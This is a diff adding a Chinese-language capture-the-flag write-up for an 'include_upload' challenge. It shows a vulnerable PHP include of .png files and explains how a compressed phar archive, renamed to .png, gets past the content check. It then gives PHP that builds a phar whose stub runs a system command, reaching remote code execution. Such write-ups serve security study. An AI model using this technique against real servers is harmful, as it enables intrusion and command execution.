@@ -676,3 +676,44 @@ def impression():
 
   
 
+## include_upload
+
+一个文件上传，前端应该是限死了，即使后缀是png也会对上传的内容进行校验
+
+查看页面源代码，发现有一个include.php
+
+```php
+<?php
+highlight_file(__FILE__);
+error_reporting(0);
+$file = $_GET['file'];
+if(isset($file) && strtolower(substr($file, -4)) == ".png"){
+    include'./upload/' . basename($_GET['file']);
+    exit;
+}
+```
+
+这里由于内容的校验，图片马噶了，我们考虑打phar
+
+>当我们include一个文件的时候，会调用一个叫做`compile_filename`的方法，持续跟进这个方法会发现最后有一个判断--文件名中是否包含.phar，如果是，则调用`phar_open_from_fp`，这个方法会去判断文件的压缩形式（这题对后缀有限制，所以我们使用gz或者是bzip2进行压缩），如果是gz或bzip2，则解压，并且包含。这里的解压步骤很重要，我们的phar文件内容其实还是可读的，会被题目waf，所以必须进行一次压缩，使得文件内容不可读，从而绕过题目限制，实现rce。
+
+```php
+<?php
+$phar = new Phar('exploit.phar');
+$phar->startBuffering();
+
+$stub = <<<'STUB'
+<?php
+    system('ls /');
+    __HALT_COMPILER();
+?>
+STUB;
+
+$phar->setStub($stub);
+$phar->addFromString('suny.txt', '123');
+$phar->stopBuffering();
+```
+
+生成一个phar，然后用7zip压缩，把后缀改成png，只要保证文件名或者文件路径有phar就能被解析
+
+![image-20260426151305348](https://gitee.com/bobrocket/img/raw/master/image-20260426151305348.png)
